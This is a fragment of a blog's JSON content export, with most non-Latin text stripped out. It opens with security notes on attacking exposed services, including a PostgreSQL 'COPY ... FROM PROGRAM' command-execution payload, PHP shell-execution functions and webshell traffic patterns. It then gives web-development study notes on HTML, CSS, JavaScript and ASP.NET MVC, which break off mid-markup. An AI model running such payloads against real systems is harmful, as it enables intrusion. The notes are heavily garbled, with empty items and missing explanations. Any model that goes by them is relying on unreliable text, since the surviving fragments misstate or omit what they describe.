MySQL<br>webshelludfmof</p>\n</li>\n<li><p>5432  PostgreSQL<br>postgresPoC DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM id; SELECT * FROM cmd_exec;</p>\n</li>\n<li><p>5984 CouchDB<br>http:&#x2F;&#x2F;:5984&#x2F;_utils</p>\n</li>\n<li><p>6379 Redis<br>webshell shellrootRCE</p>\n</li>\n<li><p>9200 elasticsearch</p>\n</li>\n</ul>\n<h3 id=\"ip\"><a href=\"#ip\" class=\"headerlink\" title=\"ip\"></a>ip</h3><ol>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n</ol>\n<h3 id=\"ip114-114-114-11453\"><a href=\"#ip114-114-114-11453\" class=\"headerlink\" title=\"ip114.114.114.11453\"></a>ip114.114.114.11453</h3><h3 id=\"exe\"><a href=\"#exe\" class=\"headerlink\" title=\"exe\"></a>exe</h3><ol>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n</ol>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ol>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n</ol>\n<h3 id=\"cs\"><a href=\"#cs\" class=\"headerlink\" title=\"cs\"></a>cs</h3><p></p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/zzwwhhpp/article/details/111773395\" >https://blog.csdn.net/zzwwhhpp/article/details/111773395<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"wireshark\"><a href=\"#wireshark\" class=\"headerlink\" title=\"wireshark\"></a>wireshark</h3><p>ip.src eq 192.168.1.107 or ip.dst eq 192.168.1.107</p>\n<p></p>\n<p>ip.addr eq 192.168.1.107 &#x2F;&#x2F; IPIP</p>\n<p>tcp.port eq 80 &#x2F;&#x2F; </p>\n<p>tcp.port &#x3D;&#x3D; 80</p>\n<p>tcp.port eq 2722</p>\n<p>tcp.port eq 80 or udp.port eq 80</p>\n<p>tcp.dstport &#x3D;&#x3D; 80 &#x2F;&#x2F; tcp80</p>\n<p>tcp.srcport &#x3D;&#x3D; 80 &#x2F;&#x2F; tcp80</p>\n<p> udp.port eq 15000</p>\n<p> </p>\n<p>tcp.port &gt;&#x3D; 1 and tcp.port &lt;&#x3D; 80</p>\n<p>th.dst &#x3D;&#x3D; A0:00:00:04:C5:84 &#x2F;&#x2F; mac</p>\n<p>eth.src eq A0:00:00:04:C5:84 &#x2F;&#x2F; mac</p>\n<p>eth.dst&#x3D;&#x3D;A0:00:00:04:C5:84</p>\n<p>eth.dst&#x3D;&#x3D;A0-00-00-04-C5-84</p>\n<p>eth.addr eq A0:00:00:04:C5:84 &#x2F;&#x2F; MACMACA0:00:00:04:C5:84</p>\n<p>http.request.method &#x3D;&#x3D; GET</p>\n<p>http.request.method &#x3D;&#x3D; POST</p>\n<p>http.request.uri &#x3D;&#x3D; &#x2F;img&#x2F;logo-edu.gif</p>\n<p>http contains GET</p>\n<p>http contains HTTP&#x2F;1.</p>\n<h3 id=\"shiro\"><a href=\"#shiro\" class=\"headerlink\" title=\"shiro\"></a>shiro</h3><p>1.1.3 </p>\n<p>Apache ShiroRememberMecookiecookiekeyRememberMecookieAESBase64cookie</p>\n<p>ShiroCookie</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>1. user-agent  antsword xxx</p>\n<p> 2.URLini_set(display_errors,0);</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ul>\n<li></li>\n<li></li>\n<li>2017WannaCry445</li>\n<li></li>\n<li>U</li>\n</ul>\n<h3 id=\"log4j\"><a href=\"#log4j\" class=\"headerlink\" title=\"log4j\"></a>log4j</h3><p>log4jJNDIRCE</p>\n<h3 id=\"wireshark\"><a href=\"#wireshark\" class=\"headerlink\" title=\"wireshark\"></a>wireshark</h3><h3 id=\"redis-mongodb\"><a href=\"#redis-mongodb\" class=\"headerlink\" title=\"redis mongodb\"></a>redis mongodb</h3><p>redis 6379   </p>\n<p>mongoDB 27017</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"struct2\"><a href=\"#struct2\" class=\"headerlink\" title=\"struct2\"></a>struct2</h3><p>Struts2action:redirect:redirectAction:OgnlURLOgnlURLJava</p>\n<h3 id=\"-x-X-x-x-win7win8\"><a href=\"#-x-X-x-x-win7win8\" class=\"headerlink\" title=\": x.X.x.x,win7win8\"></a>: x.X.x.x,win7win8</h3><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"sql\"><a href=\"#sql\" class=\"headerlink\" title=\"sql\"></a>sql</h3><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"php\"><a href=\"#php\" class=\"headerlink\" title=\"php\"></a>php</h3><p><strong>system()passthru()exec()pcntl_exec()shell_exec()popen()&#x2F;proc_popen() &#96;&#96;</strong></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>Accept: application&#x2F;json, text&#x2F;javascript, <em>&#x2F;</em>; q&#x3D;0.01</p>\n<p>Content-type: Application&#x2F;x-www-form-urlencoded</p>\n<p>10User-Agent,shell</p>\n<p>webshelljavawtcp49700</p>\n<p>$post&#x3D;Decrypt(file_get_contents(php:&#x2F;&#x2F;input));</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>Accepttext&#x2F;html, image&#x2F;gif, image&#x2F;jpeg, *; q&#x3D;.2, <em>&#x2F;</em>; q&#x3D;.2</p>\n<p>cookie</p>\n<p>base64rawbase64base64base64</p>\n<p>32md5base64md5+base64+md5<br>md50123456789ABCDEF(?i:[0-9A-F]{16})[\\w+&#x2F;]{4,}&#x3D;?&#x3D;?(?i:[0-9A-F]{16})md5JAVAwebshellPHP</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>&#x2F;var&#x2F;log&#x2F;</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p></p>\n<ol>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n</ol>\n<p>JavaJava Security ManagerJava</p>\n<h3 id=\"urlSQL\"><a href=\"#urlSQL\" class=\"headerlink\" title=\"urlSQL\"></a>urlSQL</h3><p>SQLSQL</p>\n<h3 id=\"-\"><a href=\"#-\" class=\"headerlink\" title=\" \"></a> </h3><p></p>\n<ol>\n<li>IP</li>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n</ol>\n<p></p>\n<ol>\n<li></li>\n<li></li>\n<li>WAF</li>\n</ol>\n<p></p>\n<h3 id=\"linux\"><a href=\"#linux\" class=\"headerlink\" title=\"linux\"></a>linux</h3><p>Linux</p>\n<ol>\n<li>&#x2F;tmpLinux</li>\n<li>&#x2F;var&#x2F;tmp&#x2F;tmp</li>\n<li>&#x2F;dev&#x2F;shmramfs&#x2F;dev&#x2F;shm</li>\n</ol>\n<p>Apache&#x2F;var&#x2F;cache&#x2F;httpdNginx&#x2F;var&#x2F;run&#x2F;nginx&#x2F;client_body_temp</p>\n<p></p>\n<h3 id=\"sql\"><a href=\"#sql\" class=\"headerlink\" title=\"sql\"></a>sql</h3><p>SQL</p>\n<ol>\n<li></li>\n<li>SQL</li>\n<li>SQL</li>\n<li></li>\n<li>SQL</li>\n</ol>\n<p>SQLWAF</p>\n"},{"title":".NET","date":"2023-03-12T15:27:39.000Z","excerpt":".NET","_content":"\n# NET\n\n# .\n\n## 1.VScode \n\n- `Live Server` ****\n- `Open-In-Browser`****\n- `HTML CSS Support`**HTMLCSS**\n- `CSS Peak`**CSSid**\n- `Prettier-Code formatter`****\n- `JavaScriptES6)CODE SNIPPETS`**ES6JavaScript**\n- `Color Info`**CSS**\n\n## \n\n## 2.HTML\n\n#### html\n\n|  | &nbsp  |\n| :------: | :----: |\n|      | &nbsp  |\n|    <     |  &lt   |\n|    >     |  &gt   |\n|    &     |  &amp  |\n|         | &pound |\n|         |  &yen  |\n|         | &copy  |\n|         |  &reg  |\n|         | &trade |\n|         | &times |\n\n#### html\n\n```html\n    <table border=\"1\" width=\"600px\">\n        <caption></caption>\n        <tr>\n            <th></th>\n            <th></th>\n            <th></th>\n            <th colspan=\"2\"></th>\n        </tr>\n        <tr>\n            <td>2021001</td>\n            <td></td>\n            <td></td>\n            <td></td>\n            <td></td>\n        </tr>\n    </table>\n```\n\n- `tr``th``td`()\n- `colspan=3`3\n- `rowspan=4`4\n\n\n\n#### form\n\n```html\n<form action=\"data.html\" method=\"get\">\n        <input type=\"text\" name=\"nusername\"\n        <br>\n        <input type=\"password\" name=\"pwd\"><br/>\n        <input type=\"submit\" value=\"\"<br/>\n        <input type=\"reset\" value=\"\"\n</form>\n```\n\n- `http://127.0.0.1:5500/data.html?nusername=123&pwd=456`data.html**<u>&</u>**\n- `action=xxxx.xxxx`**xxxx.xxxx**\n- `methon='get'``get``post`\n\n\n\n#### form\n\n```html\n<form>\n        \n        <input type=\"text\" name=\"username\" value=\"liulei\" title=\"\"\n        <br/>\n        \n        <input type=\"password\" name=\"pwd\" maxlength=\"8\" placeholder=\"8\"\n</form>\n```\n\n- `name=\"username\"`url**username**\n- `value=liulei` ``\n- `title=`**<u></u>**\n- `maxlength=8`8\n- `placeholder=\"8\"`**<u>8</u>**\n\n\n\n\n\n```html\n    <form>\n        <br/>\n        <select name=\"master\" size=\"4\" multiple=\"multiple\">\n            <option value=\"0\">.NET</option>\n            <option value=\"1\">J2EE</option>\n            <option value=\"2\">Java</option>\n            <option value=\"3\">Android</option>\n            <option value=\"4\">C</option>\n        </select>\n    </form>\n```\n\n- `size` \n- `multiple=\"multiple\"`\n- `value`**JAVA****master=2**\n\n\n\n```html\n<form >\n<input type=\"file\" name=\"myfile\" accept=\"\">\n</form>\n```\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151450148.png)\n\n\n\n\n\n```html\n<form>\n\t<input type=\"date\" name=\"mydate\">\n</form>\n```\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151450996.png)\n\n\n\n## 3.css\n\n####  CSS\n\n![-1667485429884](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151451939.png)\n\n#### \n\n|                      | 10000 |\n| -------------------------- | ----- |\n| style          | 1000  |\n| id                   | 100   |\n|  | 10    |\n|          | 1     |\n|                      | 0     |\n\n****\n\n#### CSS  2 \n\n\n\n##### 1.\n\n```css\ndiv{\n\tbackground-color:lightgrey;\n\twidth:130px;\n\tborder-left:20px solid green /**/\n\tborder-radius:5px;/**/\n\tpadding:10px;\n\tmargin:30px;\n}\ndiv:hover{\n\tbackground-color:rgb(151,248,39);\n\tcursor:pointer;\n\tbox-shadow:3px 3px 5px 1px rgba(0,0,0.2);/**/\n}\n<div></div>\n```\n\n- `background-color`\n- `width`\n- `border-left`\n- `border-radius`\n- `padding`\n- `margin`\n- `hover`\n- `cursor:pointer`\n- `box-shadow`  X Y \n\n\n\n##### 2.\n\n```html\n<ul class=\"nav\">\n\t<li><a href=\"#home\"></a></li>\n\t<li><a href=\"#news\"></a></li>\n\t<li><a href=\"#contact\"></a></li>\n\t<li><a href=\"#about\"></a></li>\n</ul>\n```\n\n\n\n```css\nul.nav {\n\tlist-style-type: none;\n}\n.nav li {\n\tfloat: left;\n}\n.nav li a:link,\n.nav li a:visited {\n        display: block;\n        width: 120px;\n        text-align: center;\n        padding: 4px;\n        color: #fff;\n        background-color: #98bf21;\n        text-decoration: none;\n}\n.nav li a:hover,\n.nav li a:active {\n    background-color: #7a991a;\n}\n```\n\n- `float:left`\n- `list-style-type`\n- `a:link`\n- `a:visited`\n- `display:block`\n- `text-align`\n- `text-decoration`\n\n## 4.JavaScript\n\n\n\n####  js\n\n- JS**<u></u>**\n- JS**<u></u>**\n- JS**<u></u>**\n- JS**<u></u>**\n\n#### JS\n\n**`=>`lambda**\n\n```js\nlet foo=function(num){\n    return num+1;\n}\nlet a=foo(100);\n\n//\n\nlet foo =(num)=>num+1;\n```\n\n **JS mapreducejoinslicesplicepushpopshiftunshift **\n\n\n\n**JS **\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n</head>\n<body>\n    <button id=\"ok\">3</button>\n</body>\n</html>\n<script>\n    let btn=document.getElementById(\"ok\");\n    btn.disabled=true;\n    let t=3;\n    function count(){\n        t--;\n        btn.innerHTML=t+\"\";\n        if(t<=0){\n            clearInterval(id);\n            btn.disabled=false;\n            btn.innerHTML=\"\";\n            let url=window.location;\n            window.loaction=\"https://www.wust.edu.cn\"\n        }\n    }\n    let id = setInterval(count,1000);\n</script>\n```\n\n- `document.getElementById` ID \n- `btn.disabled`\n- `btn.innerHTML`  HTML\n- `setInterval`\n- `clearInterval` setInterval() \n- `window.loaction`\n\n#### DOM\n\n**DOM:**\n\n**DOM**\n\n\n\n#### DOM\n\n##### 1.\n\n```html\n<ul id=\"list\">\n<li class=\"item\">1</li>\n<li class=\"item\">2</li>\n<li class=\"item\">3</li>\n</ul>\n```\n\n```js\nlet list = document.getElementById('list') // id=\"list\"#css\nconsole.log(list.innerHTML) //HTML\nlet first = document.querySelector('.item') //  class=\"item\" class\nconsole.log(first.innerHTML)\nlet second = document.querySelector('.item:nth-child(2)') //  .item css\nconsole.log(second.innerHTML)\nlet items = document.querySelectorAll('.item') //  .item NodeList\nconsole.log(items.length) //\nfor ( let el of items ) { //\nconsole.log(el)\n}\n```\n\n##### 2.document.createElement\n\n```html\n<ul id=\"list\">\n<li class=\"item\">1</li>\n<li class=\"item\">2</li>\n<li class=\"item\">3</li>\n</ul>\n```\n\n```js\nlet list = document.createElement('ul') //1ul\nlist.id = 'list' // id\nfor ( let i = 0; i < 3; i++ ) {\nlet item = document.createElement('li') //3li\nitem.className = 'item' // class\nitem.innerText = `${i + 1}` // innerText ()\nlist.appendChild(item) // \n}\n// listbody\ndocument.body.appendChild(list)\n```\n\n#### JSON\n\n- **<u></u>**\n- **<u></u>**\n- **<u></u>**\n- **<u></u>**\n\n**JSONJavaScriptJSON     null**\n\n**jsonDate**\n\n\n\n#### JSON.parse\n\n** JSON.parse(text [, reviver]) JSONJavaScript**\n\n** **\n\n- `text`JSON ()\n- `reviver` \n\n```js\nlet jstr = '{\"name\":\"wust\", \"url\":\"www.wust.edu.cn\",\"birthday\":\"1898-11-21\"}';\nlet obj = JSON.parse( jstr, function(key, value) {\n\tif (key == \"birthday\") {\n\t\tlet diff = new Date() - new Date(value); //\n\t\tlet year = parseInt(diff / 1000 / 60 / 60 / 24 / 365); //\n\t\treturn year;\n\t}else{\n        return value;\n    }\n})\nconsole.log(jsonObj.birthday);\n```\n\n# .MVC\n\n#### 1.MVC\n\n- MVC:3**<u>ModelViewController</u>**\n- MVC\n- **** **** **UI**\n\n#### 2.MVC\n\n- C\n- M\n- V\n\n#### 3.MVC\n\n ControllerView()\n\n Model\n\n Model\n\n \n\n \n\n URLURL\n\n \n\n#### 4.MVC\n\n![-1667485456621](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151451438.png)\n\n#### 5.Razor\n\n`Razor`RazorC#HTML\n\n`Razor`\n\n C#  @{ ... } \n\n \n\n  @ \n\n C# \n\n#### 6.ViewData\n\n- ViewDataControllerView\n- ViewDataView\n- ()ViewDatanull\n- ViewData\n\n#### 7.TrmpData\n\n- TempDataSession\n- TempDataAction(Redirection)\n- TempData\n- TempDataViewData\n\n#### 8.\n\n![-1667485469907](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151451623.png)\n\n#### 9.EF Core\n\n **<u>Add-Migration InitialCreate</u>**\n\n **<u>Uppate-Database</u>**\n\n#### 10.ORM\n\n> ORM (Object Relation Mapping) /\n\n#### 11.ORM\n\n \n\n \n\n ()\n\n() \n\n  \n\n#### 12.DateType\n\n|     DataType      |              |\n| :---------------------: | :--------------: |\n|    DataType.Currency    |        |\n|      DataType.Date      |        |\n|  DataType.EmailAddress  |  |\n| DataType.Multiline Text |      |\n|    DataType.Password    |        |\n|      DataType.Time      |        |\n|      DataType.Url       |  URL   |\n\n#### 13.\n\n `[Required]` null\n\n `[StringLength]`\n\n `[Range]`\n\n `[Compare]`\n\n `[RegularExpression]` \n\n `[EmailAddress]`\n\n`[DataType]`\n\n#### 14.\n\n `[HttpPost] `POSTAction[HttpGet] (CreateGET)\n\n `[ValidateAntiForgeryToken] ` ()\n\n#### 15.\n\n ViewData ()\n\n \n\n \n\n\t\t  return View(); \n\t\n\t\t  @model \n\t\n\t\t ModelModel\n\n#### 16.\n\n id \n\n```\npublic class MoviesController : Controller\n{\nprivate readonly MvcMovieContext _context;\npublic MoviesController(MvcMovieContext context)\n{\n_context = context;\n}\n// CRUD\n}\n```","source":"_posts/NET.md","raw":"---\ntitle: .NET\ndate: 2023-03-12 23:27:39\nexcerpt: .NET\ncategories: \n---\n\n# NET\n\n# .\n\n## 1.VScode \n\n- `Live Server` ****\n- `Open-In-Browser`****\n- `HTML CSS Support`**HTMLCSS**\n- `CSS Peak`**CSSid**\n- `Prettier-Code formatter`****\n- `JavaScriptES6)CODE SNIPPETS`**ES6JavaScript**\n- `Color Info`**CSS**\n\n## \n\n## 2.HTML\n\n#### html\n\n|  | &nbsp  |\n| :------: | :----: |\n|      | &nbsp  |\n|    <     |  &lt   |\n|    >     |  &gt   |\n|    &     |  &amp  |\n|         | &pound |\n|         |  &yen  |\n|         | &copy  |\n|         |  &reg  |\n|         | &trade |\n|         | &times |\n\n#### html\n\n```html\n    <table border=\"1\" width=\"600px\">\n        <caption></caption>\n        <tr>\n            <th></th>\n            <th></th>\n            <th></th>\n            <th colspan=\"2\"></th>\n        </tr>\n        <tr>\n            <td>2021001</td>\n            <td></td>\n            <td></td>\n            <td></td>\n            <td></td>\n        </tr>\n    </table>\n```\n\n- `tr``th``td`()\n- `colspan=3`3\n- `rowspan=4`4\n\n\n\n#### form\n\n```html\n<form action=\"data.html\" method=\"get\">\n        <input type=\"text\" name=\"nusername\"\n        <br>\n        <input type=\"password\" name=\"pwd\"><br/>\n        <input type=\"submit\" value=\"\"<br/>\n        <input type=\"reset\" value=\"\"\n</form>\n```\n\n- `http://127.0.0.1:5500/data.html?nusername=123&pwd=456`data.html**<u>&</u>**\n- `action=xxxx.xxxx`**xxxx.xxxx**\n- `methon='get'``get``post`\n\n\n\n#### form\n\n```html\n<form>\n        \n        <input type=\"text\" name=\"username\" value=\"liulei\" title=\"\"\n        <br/>\n        \n        <input type=\"password\" name=\"pwd\" maxlength=\"8\" placeholder=\"8\"\n</form>\n```\n\n- `name=\"username\"`url**username**\n- `value=liulei` ``\n- `title=`**<u></u>**\n- `maxlength=8`8\n- `placeholder=\"8\"`**<u>8</u>**\n\n\n\n\n\n```html\n    <form>\n        <br/>\n        <select name=\"master\" size=\"4\" multiple=\"multiple\">\n            <option value=\"0\">.NET</option>\n            <option value=\"1\">J2EE</option>\n            <option value=\"2\">Java</option>\n            <option value=\"3\">Android</option>\n            <option value=\"4\">C</option>\n        </select>\n    </form>\n```\n\n- `size` \n- `multiple=\"multiple\"`\n- `value`**JAVA****master=2**\n\n\n\n```html\n<form >\n<input type=\"file\" name=\"myfile\" accept=\"\">\n</form>\n```\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151450148.png)\n\n\n\n\n\n```html\n<form>\n\t<input type=\"date\" name=\"mydate\">\n</form>\n```\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151450996.png)\n\n\n\n## 3.css\n\n####  CSS\n\n![-1667485429884](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151451939.png)\n\n#### \n\n|                      | 10000 |\n| -------------------------- | ----- |\n| style          | 1000  |\n| id                   | 100   |\n|  | 10    |\n|          | 1     |\n|                      | 0     |\n\n****\n\n#### CSS  2 \n\n\n\n##### 1.\n\n```css\ndiv{\n\tbackground-color:lightgrey;\n\twidth:130px;\n\tborder-left:20px solid green /**/\n\tborder-radius:5px;/**/\n\tpadding:10px;\n\tmargin:30px;\n}\ndiv:hover{\n\tbackground-color:rgb(151,248,39);\n\tcursor:pointer;\n\tbox-shadow:3px 3px 5px 1px rgba(0,0,0.2);/**/\n}\n<div></div>\n```\n\n- `background-color`\n- `width`\n- `border-left`\n- `border-radius`\n- `padding`\n- `margin`\n- `hover`\n- `cursor:pointer`\n- `box-shadow`  X Y \n\n\n\n##### 2.\n\n```html\n<ul class=\"nav\">\n\t<li><a href=\"#home\"></a></li>\n\t<li><a href=\"#news\"></a></li>\n\t<li><a href=\"#contact\"></a></li>\n\t<li><a href=\"#about\"></a></li>\n</ul>\n```\n\n\n\n```css\nul.nav {\n\tlist-style-type: none;\n}\n.nav li {\n\tfloat: left;\n}\n.nav li a:link,\n.nav li a:visited {\n        display: block;\n        width: 120px;\n        text-align: center;\n        padding: 4px;\n        color: #fff;\n        background-color: #98bf21;\n        text-decoration: none;\n}\n.nav li a:hover,\n.nav li a:active {\n    background-color: #7a991a;\n}\n```\n\n- `float:left`\n- `list-style-type`\n- `a:link`\n- `a:visited`\n- `display:block`\n- `text-align`\n- `text-decoration`\n\n## 4.JavaScript\n\n\n\n####  js\n\n- JS**<u></u>**\n- JS**<u></u>**\n- JS**<u></u>**\n- JS**<u></u>**\n\n#### JS\n\n**`=>`lambda**\n\n```js\nlet foo=function(num){\n    return num+1;\n}\nlet a=foo(100);\n\n//\n\nlet foo =(num)=>num+1;\n```\n\n **JS mapreducejoinslicesplicepushpopshiftunshift **\n\n\n\n**JS **\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n</head>\n<body>\n    <button id=\"ok\">3</button>\n</body>\n</html>\n<script>\n    let btn=document.getElementById(\"ok\");\n    btn.disabled=true;\n    let t=3;\n    function count(){\n        t--;\n        btn.innerHTML=t+\"\";\n        if(t<=0){\n            clearInterval(id);\n            btn.disabled=false;\n            btn.innerHTML=\"\";\n            let url=window.location;\n            window.loaction=\"https://www.wust.edu.cn\"\n        }\n    }\n    let id = setInterval(count,1000);\n</script>\n```\n\n- `document.getElementById` ID \n- `btn.disabled`\n- `btn.innerHTML`  HTML\n- `setInterval`\n- `clearInterval` setInterval() \n- `window.loaction`\n\n#### DOM\n\n**DOM:**\n\n**DOM**\n\n\n\n#### DOM\n\n##### 1.\n\n```html\n<ul id=\"list\">\n<li class=\"item\">1</li>\n<li class=\"item\">2</li>\n<li class=\"item\">3</li>\n</ul>\n```\n\n```js\nlet list = document.getElementById('list') // id=\"list\"#css\nconsole.log(list.innerHTML) //HTML\nlet first = document.querySelector('.item') //  class=\"item\" class\nconsole.log(first.innerHTML)\nlet second = document.querySelector('.item:nth-child(2)') //  .item css\nconsole.log(second.innerHTML)\nlet items = document.querySelectorAll('.item') //  .item NodeList\nconsole.log(items.length) //\nfor ( let el of items ) { //\nconsole.log(el)\n}\n```\n\n##### 2.document.createElement\n\n```html\n<ul id=\"list\">\n<li class=\"item\">1</li>\n<li class=\"item\">2</li>\n<li class=\"item\">3</li>\n</ul>\n```\n\n```js\nlet list = document.createElement('ul') //1ul\nlist.id = 'list' // id\nfor ( let i = 0; i < 3; i++ ) {\nlet item = document.createElement('li') //3li\nitem.className = 'item' // class\nitem.innerText = `${i + 1}` // innerText ()\nlist.appendChild(item) // \n}\n// listbody\ndocument.body.appendChild(list)\n```\n\n#### JSON\n\n- **<u></u>**\n- **<u></u>**\n- **<u></u>**\n- **<u></u>**\n\n**JSONJavaScriptJSON     null**\n\n**jsonDate**\n\n\n\n#### JSON.parse\n\n** JSON.parse(text [, reviver]) JSONJavaScript**\n\n** **\n\n- `text`JSON ()\n- `reviver` \n\n```js\nlet jstr = '{\"name\":\"wust\", \"url\":\"www.wust.edu.cn\",\"birthday\":\"1898-11-21\"}';\nlet obj = JSON.parse( jstr, function(key, value) {\n\tif (key == \"birthday\") {\n\t\tlet diff = new Date() - new Date(value); //\n\t\tlet year = parseInt(diff / 1000 / 60 / 60 / 24 / 365); //\n\t\treturn year;\n\t}else{\n        return value;\n    }\n})\nconsole.log(jsonObj.birthday);\n```\n\n# .MVC\n\n#### 1.MVC\n\n- MVC:3**<u>ModelViewController</u>**\n- MVC\n- **** **** **UI**\n\n#### 2.MVC\n\n- C\n- M\n- V\n\n#### 3.MVC\n\n ControllerView()\n\n Model\n\n Model\n\n \n\n \n\n URLURL\n\n \n\n#### 4.MVC\n\n![-1667485456621](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151451438.png)\n\n#### 5.Razor\n\n`Razor`RazorC#HTML\n\n`Razor`\n\n C#  @{ ... } \n\n \n\n  @ \n\n C# \n\n#### 6.ViewData\n\n- ViewDataControllerView\n- ViewDataView\n- ()ViewDatanull\n- ViewData\n\n#### 7.TrmpData\n\n- TempDataSession\n- TempDataAction(Redirection)\n- TempData\n- TempDataViewData\n\n#### 8.\n\n![-1667485469907](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151451623.png)\n\n#### 9.EF Core\n\n **<u>Add-Migration InitialCreate</u>**\n\n **<u>Uppate-Database</u>**\n\n#### 10.ORM\n\n> ORM (Object Relation Mapping) /\n\n#### 11.ORM\n\n \n\n \n\n ()\n\n() \n\n  \n\n#### 12.DateType\n\n|     DataType      |              |\n| :---------------------: | :--------------: |\n|    DataType.Currency    |        |\n|      DataType.Date      |        |\n|  DataType.EmailAddress  |  |\n| DataType.Multiline Text |      |\n|    DataType.Password    |        |\n|      DataType.Time      |        |\n|      DataType.Url       |  URL   |\n\n#### 13.\n\n `[Required]` null\n\n `[StringLength]`\n\n `[Range]`\n\n `[Compare]`\n\n `[RegularExpression]` \n\n `[EmailAddress]`\n\n`[DataType]`\n\n#### 14.\n\n `[HttpPost] `POSTAction[HttpGet] (CreateGET)\n\n `[ValidateAntiForgeryToken] ` ()\n\n#### 15.\n\n ViewData ()\n\n \n\n \n\n\t\t  return View(); \n\t\n\t\t  @model \n\t\n\t\t ModelModel\n\n#### 16.\n\n id \n\n```\npublic class MoviesController : Controller\n{\nprivate readonly MvcMovieContext _context;\npublic MoviesController(MvcMovieContext context)\n{\n_context = context;\n}\n// CRUD\n}\n```","slug":"NET","published":1,"updated":"2024-04-17T08:43:00.239Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7i90004h776638ueyi2","content":"<h1 id=\"NET\"><a href=\"#NET\" class=\"headerlink\" title=\"NET\"></a>NET</h1><h1 id=\"-\"><a href=\"#-\" class=\"headerlink\" title=\".\"></a>.</h1><h2 id=\"1-VScode-\"><a href=\"#1-VScode-\" class=\"headerlink\" title=\"1.VScode \"></a>1.VScode </h2><ul>\n<li><code>Live Server</code> <strong></strong></li>\n<li><code>Open-In-Browser</code><strong></strong></li>\n<li><code>HTML CSS Support</code><strong>HTMLCSS</strong></li>\n<li><code>CSS Peak</code><strong>CSSid</strong></li>\n<li><code>Prettier-Code formatter</code><strong></strong></li>\n<li><code>JavaScriptES6)CODE SNIPPETS</code><strong>ES6JavaScript</strong></li>\n<li><code>Color Info</code><strong>CSS</strong></li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h2 id=\"2-HTML\"><a href=\"#2-HTML\" class=\"headerlink\" title=\"2.HTML\"></a>2.HTML</h2><h4 id=\"html\"><a href=\"#html\" class=\"headerlink\" title=\"html\"></a>html</h4><table>\n<thead>\n<tr>\n<th align=\"center\"></th>\n<th align=\"center\">&amp;nbsp</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"></td>\n<td align=\"center\">&amp;nbsp</td>\n</tr>\n<tr>\n<td align=\"center\">&lt;</td>\n<td align=\"center\">&amp;lt</td>\n</tr>\n<tr>\n<td align=\"center\">&gt;</td>\n<td align=\"center\">&amp;gt</td>\n</tr>\n<tr>\n<td align=\"center\">&amp;</td>\n<td align=\"center\">&amp;amp</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">&amp;pound</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">&amp;yen</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">&amp;copy</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">&amp;reg</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">&amp;trade</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">&amp;times</td>\n</tr>\n</tbody></table>\n<h4 id=\"html\"><a href=\"#html\" class=\"headerlink\" title=\"html\"></a>html</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span 